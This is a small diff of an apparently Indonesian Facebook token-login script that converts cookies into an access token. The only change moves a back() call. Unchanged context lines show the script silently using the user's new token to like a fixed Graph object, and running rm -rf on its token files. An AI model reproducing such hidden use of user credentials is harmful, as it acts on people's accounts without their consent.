@@ -508,10 +508,10 @@ def login_lagi334():
 									Console().print(Panel(f"""[bold cyan][+] Token : [bold green]{tok2}""",width=80, style=f"{color_panel}", title="[bold green]> TOKEN EAAG [bold green]<"))
 									requests.post(f"https://graph.facebook.com/878169396977639/likes?summary=true&access_token={tok2}")
 									Console().print(f" {H2}• {P2}[bold green]Login Berhasil,Sedang Menjalankan Ulang[bold white]")
-									
+								back()
 							except Exception as e:
 								return('Cookies Invalid')
-			back()
+			
 			except Exception as e:
 				Console().print(f" {H2}• {P2}[bold red]Cookies Kadaluwarsa Bang")
 				os.system('rm -rf .token.txt && rm -rf .cok.txt && rm -rf .token1.txt && rm -rf .token.txt')
